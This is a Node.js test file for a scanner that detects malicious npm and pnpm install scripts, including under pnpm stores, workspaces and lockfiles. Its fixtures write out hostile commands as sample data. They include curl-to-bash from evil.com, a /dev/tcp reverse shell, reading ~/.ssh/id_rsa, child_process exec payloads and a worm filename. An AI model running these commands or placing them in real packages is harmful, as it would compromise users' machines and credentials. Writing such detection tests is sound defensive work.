'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const { checkScripts } = require('../src/scanners/lifecycle-scripts');

describe('lifecycle-scripts scanner', () => {
  it('flags curl piped to bash in postinstall', () => {
    const scripts = { postinstall: 'curl http://evil.com/payload.sh | bash' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.equal(hits[0].hook, 'postinstall');
    assert.equal(hits[0].severity, 'critical');
    assert.ok(hits[0].triggers.includes('pipe-to-shell'));
  });

  it('flags wget piped to sh in preinstall', () => {
    const scripts = { preinstall: 'wget https://x.com/s.sh | sh' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.equal(hits[0].severity, 'critical');
    assert.ok(hits[0].triggers.includes('pipe-to-shell'));
  });

  it('flags node -e eval in install', () => {
    const scripts = { install: "node -e 'require(\"child_process\").exec(\"whoami\")'" };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('node-eval'));
    assert.ok(hits[0].triggers.includes('child_process-import'));
  });

  it('flags base64 decoding', () => {
    const scripts = { postinstall: 'Buffer.from("aGVsbG8=", "base64")' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('base64-decode'));
  });

  it('flags IP address URLs', () => {
    const scripts = { postinstall: 'curl http://192.168.1.1/payload' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('ip-address-url'));
  });

  it('flags credential file access', () => {
    const scripts = { postinstall: 'cat ~/.ssh/id_rsa' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('credential-file-access'));
  });

  it('flags reverse shell patterns', () => {
    const scripts = { postinstall: 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.equal(hits[0].severity, 'critical');
    assert.ok(hits[0].triggers.includes('reverse-shell'));
  });

  it('ignores safe scripts', () => {
    const scripts = {
      postinstall: 'node scripts/build.js',
      preinstall: 'npx check-engine',
      prepare: 'husky install',
    };
    const hits = checkScripts(scripts, 'safe-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 0);
  });

  it('ignores non-lifecycle scripts', () => {
    const scripts = {
      start: 'curl http://evil.com | bash',
      test: 'node -e "process.exit(1)"',
      build: 'eval some-thing',
    };
    const hits = checkScripts(scripts, 'pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 0);
  });

  it('truncates long scripts in output', () => {
    const longScript = 'curl http://evil.com/x | bash ' + 'A'.repeat(600);
    const scripts = { postinstall: longScript };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].script.length <= 500);
  });

  it('detects multiple triggers on a single hook', () => {
    const scripts = { postinstall: 'node -e \'require("child_process").exec("curl http://192.168.1.1/x | bash")\'' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.length >= 3);
  });
});

describe('lifecycle-scripts referenced files and robustness', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { scan } = require('../src/scanners/lifecycle-scripts');
  let tmp;
  const { beforeEach, afterEach } = require('node:test');
  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-lc-')); });
  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });

  function pkg(dir, json, files = {}) {
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(json));
    for (const [f, c] of Object.entries(files)) {
      fs.mkdirSync(path.dirname(path.join(dir, f)), { recursive: true });
      fs.writeFileSync(path.join(dir, f), c);
    }
  }

  it('flags a known worm payload filename (Shai-Hulud setup_bun.js)', () => {
    pkg(tmp, { scripts: { preinstall: 'node setup_bun.js' } }, { 'setup_bun.js': 'console.log(1)' });
    const hits = checkScripts({ preinstall: 'node setup_bun.js' }, 'x', 'p', tmp);
    assert.equal(hits.length, 1);
    assert.equal(hits[0].severity, 'critical');
    assert.ok(hits[0].triggers.includes('known-worm-filename'));
  });

  it('inspects the file a hook runs, not just the script string', () => {
    const hits = (() => {
      pkg(tmp, {}, { 'scripts/install.js': 'require("child_process").execSync("curl -s http://evil.example/x | sh")' });
      return checkScripts({ postinstall: 'node scripts/install.js' }, 'x', 'p', tmp);
    })();
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('pipe-to-shell'));
    assert.deepEqual(hits[0].script_files, ['scripts/install.js']);
  });

  it('does not flag a typical native-build installer', () => {
    pkg(tmp, {}, { 'install.js': 'const { execSync } = require("child_process");\nconst https = require("https");\nexecSync("node-gyp rebuild", { env: process.env });' });
    assert.equal(checkScripts({ postinstall: 'node install.js' }, 'x', 'p', tmp).length, 0);
  });

  it('does not flag a curl|bash string a JS file cannot run (bun install.js)', () => {
    pkg(tmp, {}, { 'install.js': 'const cp = require("child_process");\nlet installScript = "curl -fsSL https://bun.com/install | bash";\ncp.spawnSync(process.execPath, ["--version"]);\nthrow new Error("install using: " + installScript);\n' });
    assert.equal(checkScripts({ postinstall: 'node install.js' }, 'bun', 'p', tmp).length, 0);
  });

  it('does not flag a curl|bash string when the file spawns a shell for something unrelated (bun 1.1-1.3)', () => {
    pkg(tmp, {}, { 'install.js': [
      'const { spawn } = require("./spawn");',
      'function isWindowsAVX2() {',
      '  return spawn("powershell", ["-c", "(Add-Type -MemberDefinition x -Name Cpu).IsProcessorFeaturePresent(40)"]).stdout.trim() === "True";',
      '}',
      ...Array.from({ length: 30 }, (_, i) => `// filler line ${i} to separate the functions as in the real file`),
      'function optimizeBun() {',
      '  let installScript = "curl -fsSL https://bun.com/install | bash";',
      '  throw new Error("install using the following command: " + installScript);',
      '}',
    ].join('\n') });
    assert.equal(checkScripts({ postinstall: 'node install.js' }, 'bun', 'p', tmp).length, 0);
  });

  it('flags a curl|bash string a JS file can run through a shell', () => {
    for (const sink of ['require("child_process").execSync(c)', 'require("child_process").spawnSync(c, { shell: true })', 'require("child_process").spawn("sh", ["-c", c])', 'eval(c)']) {
      pkg(tmp, {}, { 'install.js': `const c = "curl -fsSL https://evil.example/i | bash";\n${sink};\n` });
      assert.equal(checkScripts({ postinstall: 'node install.js' }, 'x', 'p', tmp).length, 1, sink);
    }
  });

  it('ignores referenced files outside the package directory', () => {
    fs.writeFileSync(path.join(tmp, 'outside.js'), 'curl http://1.2.3.4/x | bash');
    const inner = path.join(tmp, 'inner');
    fs.mkdirSync(inner);
    assert.equal(checkScripts({ postinstall: 'node ../outside.js' }, 'x', 'p', inner).length, 0);
  });

  it('stays fast on hostile long scripts', () => {
    const start = Date.now();
    checkScripts({ postinstall: 'nc '.repeat(40000) }, 'x', 'p', tmp);
    assert.ok(Date.now() - start < 500, `took ${Date.now() - start}ms`);
  });

  it('scans scoped, nested, and global node_modules', async () => {
    const proj = path.join(tmp, 'proj');
    const evil = { scripts: { postinstall: 'curl http://evil.example/x | bash' } };
    pkg(path.join(proj, 'node_modules', '@scope', 'a'), evil);
    pkg(path.join(proj, 'node_modules', 'b', 'node_modules', 'c'), evil);
    pkg(path.join(tmp, 'global', 'lib', 'node_modules', 'g'), evil);
    const r = await scan({ npmGlobalDirs: [path.join(tmp, 'global')] }, {}, [{ project: 'proj', project_path: proj }]);
    assert.deepEqual(r.findings.map(f => f.path.slice(tmp.length)).sort(), [
      path.join('/global', 'lib', 'node_modules', 'g'),
      path.join('/proj', 'node_modules', '@scope', 'a'),
      path.join('/proj', 'node_modules', 'b', 'node_modules', 'c'),
    ].sort());
  });
});

describe('lifecycle-scripts with pnpm and workspaces', { skip: process.platform === 'win32' }, () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { scan } = require('../src/scanners/lifecycle-scripts');
  const { beforeEach, afterEach } = require('node:test');
  let tmp;
  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-pnpm-')); });
  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });
  const pkg = (dir, json) => { fs.mkdirSync(dir, { recursive: true }); fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(json)); };
  const evil = (name) => ({ name, scripts: { postinstall: 'curl http://evil.example/x | bash' } });

  it('scans pnpm direct and transitive packages once each', async () => {
    const proj = path.join(tmp, 'proj');
    const store = path.join(proj, 'node_modules', '.pnpm');
    pkg(path.join(store, 'direct@1.0.0', 'node_modules', 'direct'), evil('direct'));
    pkg(path.join(store, 'deep@2.0.0', 'node_modules', 'deep'), evil('deep'));
    fs.symlinkSync(path.join(store, 'deep@2.0.0', 'node_modules', 'deep'), path.join(store, 'direct@1.0.0', 'node_modules', 'deep'));
    fs.symlinkSync(path.join(store, 'direct@1.0.0', 'node_modules', 'direct'), path.join(proj, 'node_modules', 'direct'));
    const r = await scan({}, {}, [{ project: 'proj', project_path: proj }]);
    assert.deepEqual(r.findings.map(f => f.package).sort(), ['deep', 'direct']);
    assert.equal(r.packages_scanned, 2);
  });

  it('follows workspace symlinks inside the project but not links leaving it', async () => {
    const proj = path.join(tmp, 'mono');
    pkg(path.join(proj, 'packages', 'app'), evil('@mono/app'));
    pkg(path.join(tmp, 'elsewhere', 'linked'), evil('linked'));
    fs.mkdirSync(path.join(proj, 'node_modules', '@mono'), { recursive: true });
    fs.symlinkSync(path.join(proj, 'packages', 'app'), path.join(proj, 'node_modules', '@mono', 'app'));
    fs.symlinkSync(path.join(tmp, 'elsewhere', 'linked'), path.join(proj, 'node_modules', 'linked'));
    const r = await scan({}, {}, [{ project: 'mono', project_path: proj }]);
    assert.deepEqual(r.findings.map(f => f.package), ['@mono/app']);
  });
});

describe('lifecycle-scripts with npm hidden lockfile', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { scan } = require('../src/scanners/lifecycle-scripts');
  const { beforeEach, afterEach } = require('node:test');
  let tmp;
  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-hidden-')); });
  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });
  const pkg = (dir, json) => { fs.mkdirSync(dir, { recursive: true }); fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(json)); };
  const evil = { name: 'evil', scripts: { postinstall: 'curl http://evil.example/x | bash' } };

  function project(hiddenPackages) {
    const proj = path.join(tmp, 'p');
    pkg(path.join(proj, 'node_modules', 'evil'), evil);
    pkg(path.join(proj, 'node_modules', 'quiet'), { name: 'quiet', scripts: { postinstall: 'curl http://not-read.example | sh' } });
    pkg(path.join(proj, 'node_modules', 'plain'), { name: 'plain' });
    fs.writeFileSync(path.join(proj, 'node_modules', '.package-lock.json'), JSON.stringify({ name: 'p', lockfileVersion: 3, packages: hiddenPackages }));
    return proj;
  }

  it('reads only packages npm marked with install scripts', async () => {
    const proj = project({
      'node_modules/evil': { version: '1.0.0', hasInstallScript: true },
      'node_modules/quiet': { version: '1.0.0' },
      'node_modules/plain': { version: '1.0.0' },
      '../../escape': { hasInstallScript: true },
    });
    const r = await scan({}, {}, [{ project: 'p', project_path: proj }]);
    assert.equal(r.hidden_lockfiles_used, 1);
    assert.equal(r.package_json_reads, 1);
    assert.equal(r.packages_scanned, 3);
    assert.deepEqual(r.findings.map(f => f.package), ['evil']);
  });

  it('falls back to walking node_modules when the hidden lockfile is older than node_modules', async () => {
    const proj = project({ 'node_modules/evil': { version: '1.0.0', hasInstallScript: true } });
    const old = new Date(Date.now() - 3600 * 1000);
    fs.utimesSync(path.join(proj, 'node_modules', '.package-lock.json'), old, old);
    const r = await scan({}, {}, [{ project: 'p', project_path: proj }]);
    assert.equal(r.hidden_lockfiles_used, 0);
    assert.deepEqual(r.findings.map(f => f.package).sort(), ['evil', 'quiet']);
  });
});

describe('lifecycle-scripts pnpm 10 build record', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { scan } = require('../src/scanners/lifecycle-scripts');
  const { beforeEach, afterEach } = require('node:test');
  let tmp;
  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-pnpm10-')); });
  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });
  const pkg = (dir, json) => { fs.mkdirSync(dir, { recursive: true }); fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(json)); };
  const bad = (name) => ({ name, scripts: { postinstall: 'curl http://evil.example/x | bash' } });

  // Layout and record as written by pnpm 10 (node_modules/.modules.yaml is JSON).
  function project({ ignoredBuilds = ['blocked@1.0.0'], record = {}, rootPkg = {}, lock = '' } = {}) {
    const proj = path.join(tmp, 'p');
    const store = path.join(proj, 'node_modules', '.pnpm');
    pkg(proj, { name: 'p', ...rootPkg });
    pkg(path.join(store, 'blocked@1.0.0', 'node_modules', 'blocked'), bad('blocked'));
    pkg(path.join(store, 'allowed@2.0.0', 'node_modules', 'allowed'), bad('allowed'));
    pkg(path.join(store, '@s+peer@1.0.0_react@18.2.0', 'node_modules', '@s', 'peer'), bad('@s/peer'));
    // Has a script but pnpm did not record a build: only a full walk would read it.
    pkg(path.join(store, 'unrecorded@1.0.0', 'node_modules', 'unrecorded'), bad('unrecorded'));
    pkg(path.join(store, 'plain@1.0.0', 'node_modules', 'plain'), { name: 'plain' });
    fs.writeFileSync(path.join(store, 'lock.yaml'), lock);
    fs.writeFileSync(path.join(proj, 'node_modules', '.modules.yaml'), JSON.stringify({
      packageManager: 'pnpm@10.34.9', nodeLinker: 'isolated', virtualStoreDir: '.pnpm', ignoredBuilds, ...record,
    }));
    return proj;
  }
  const run = async (proj, platform = {}) => scan(platform, {}, [{ project: 'p', project_path: proj }]);
  const names = (r) => r.findings.filter(f => f.type === 'suspicious_lifecycle_script').map(f => f.package).sort();

  it('reads only packages pnpm recorded as blocked or allowed builds', async () => {
    const r = await run(project({ ignoredBuilds: ['blocked@1.0.0', '@s/peer@1.0.0'], rootPkg: { pnpm: { onlyBuiltDependencies: ['allowed'] } } }));
    assert.equal(r.pnpm_build_records_used, 1);
    assert.equal(r.package_json_reads, 3);
    assert.equal(r.packages_scanned, 5);
    assert.deepEqual(names(r), ['@s/peer', 'allowed', 'blocked']);
  });

  it('reads allowed builds listed in pnpm-workspace.yaml', async () => {
    const proj = project();
    fs.writeFileSync(path.join(proj, 'pnpm-workspace.yaml'), "packages:\n  - 'apps/*'\nonlyBuiltDependencies:\n  - allowed\n");
    assert.deepEqual(names(await run(proj)), ['allowed', 'blocked']);
  });

  it('reports URL dependencies from the pnpm lockfile copy', async () => {
    const lock = "packages:\n\n  evil-pad@http://203.0.113.5/evil.tgz:\n    resolution: {integrity: sha512-x, tarball: http://203.0.113.5/evil.tgz}\n    version: 1.3.0\n\n  plain@1.0.0:\n    resolution: {integrity: sha512-y}\n";
    const r = await run(project({ lock }));
    assert.deepEqual(r.findings.filter(f => f.type === 'remote_url_dependency').map(f => [f.package, f.url]), [['evil-pad', 'http://203.0.113.5/evil.tgz']]);
  });

  for (const [label, reason, setup] of [
    ['allow-all builds in pnpm-workspace.yaml', 'allow-all builds in project config', (proj) => fs.writeFileSync(path.join(proj, 'pnpm-workspace.yaml'), 'dangerouslyAllowAllBuilds: true\n')],
    ['allow-all builds in package.json', 'allow-all builds in project config', (proj) => pkg(proj, { name: 'p', pnpm: { dangerouslyAllowAllBuilds: true } })],
    ['allow-all builds in the project .npmrc', 'allow-all builds in project config', (proj) => fs.writeFileSync(path.join(proj, '.npmrc'), 'dangerously-allow-all-builds=true\n')],
    ['a record older than node_modules', 'record older than node_modules', (proj) => { const old = new Date(Date.now() - 3600 * 1000); fs.utimesSync(path.join(proj, 'node_modules', '.modules.yaml'), old, old); }],
    ['a pnpm 9 record (YAML)', 'pnpm 9 (record needs pnpm 10+)', (proj) => fs.writeFileSync(path.join(proj, 'node_modules', '.modules.yaml'), 'layoutVersion: 5\npackageManager: pnpm@9.15.0\n')],
    ['a recorded package that cannot be located', 'recorded package not found', (proj) => fs.writeFileSync(path.join(proj, 'node_modules', '.modules.yaml'), JSON.stringify({ packageManager: 'pnpm@10.1.0', ignoredBuilds: ['missing@9.9.9'] }))],
  ]) {
    it(`walks the whole store for ${label}`, async () => {
      const proj = project();
      setup(proj);
      const r = await run(proj);
      assert.equal(r.pnpm_build_records_used, 0);
      assert.deepEqual(r.pnpm_record_fallbacks, { [reason]: 1 });
      assert.ok(names(r).includes('unrecorded'), names(r).join(','));
    });
  }

  it('walks the whole store when a user enabled allow-all builds globally', async () => {
    const proj = project();
    const home = path.join(tmp, 'home');
    fs.mkdirSync(path.join(home, 'AppData', 'Local', 'pnpm', 'config'), { recursive: true });
    fs.writeFileSync(path.join(home, 'AppData', 'Local', 'pnpm', 'config', 'rc'), 'dangerously-allow-all-builds=true\n');
    const r = await run(proj, { userHomes: [home] });
    assert.equal(r.pnpm_build_records_used, 0);
    assert.deepEqual(r.pnpm_record_fallbacks, { 'allow-all builds in user config': 1 });
    assert.ok(names(r).includes('unrecorded'));
  });
});
